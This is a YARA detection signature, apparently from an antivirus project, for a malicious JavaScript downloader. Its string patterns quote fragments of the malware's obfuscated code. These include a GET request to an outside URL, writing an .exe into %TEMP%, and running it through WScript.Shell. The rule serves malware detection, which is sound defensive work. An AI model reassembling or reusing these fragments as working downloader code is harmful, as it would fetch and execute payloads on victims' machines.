rule sig_20160328_bb27b497a8a4c8423f72563779730463 {
  meta:
    description = "datamaliciousorder - file 20160328_bb27b497a8a4c8423f72563779730463.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ffcd74f0b4af43a111939e954d3e994539cd89fa979f335897134423d48e12ed"

  strings:
    $s1  = "function Nizepyysp() {return Byvni[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8RYIDgB70.exe\";};" fullword ascii
    $s2  = "Whrmnkjsxj[Mveqpzrxep](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Znyljnd](Zlqvqn() * 11)} while (Whrmnkjsxj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Vnzxpyfmzr(Uoxilyh, Tgkail){return Uoxilyh - Tgkail;};" fullword ascii
    $s5  = "var Byvni = function Hxumw() {return WScript[Goyyl](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xxmefelw() {return ((Wsxrir == true) && (Wsxrir == Txztoojm)) ? 1 : Cexmdz;};" fullword ascii
    $s7  = "function Rytyrdnef(Ceftq){Byvni[\"Run\"](Ceftq, Cexmdz, Cexmdz);};" fullword ascii
    $s8  = "Wsxrir = true; " fullword ascii
    $s9  = "Txztoojm = true; " fullword ascii
    $s10 = "var Wsxrir = false;" fullword ascii
    $s11 = "function Ptlewxgavv(){return Goyyl;};" fullword ascii
    $s12 = "var Txztoojm = false;" fullword ascii
    $s13 = "var Zhbxiqv = false;" fullword ascii
    $s14 = "function Kawpunzr()" fullword ascii
    $s15 = "function Fdiyn(){return Wfwuarvm;};" fullword ascii
    $s16 = "var Ymrrwz = new this[\"Date\"]();" fullword ascii
    $s17 = "function Vhfzqt(Uzpzwcdfl) {var Bqezbmtvbq = (1, 2, 3, 4, 5, Uzpzwcdfl); return Bqezbmtvbq;};" fullword ascii
    $s18 = "function Zlqvqn(){return 22;};" fullword ascii
    $s19 = " while (Acuyaxw){" fullword ascii
    $s20 = "} catch(Unlcofk){Acuyaxw = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}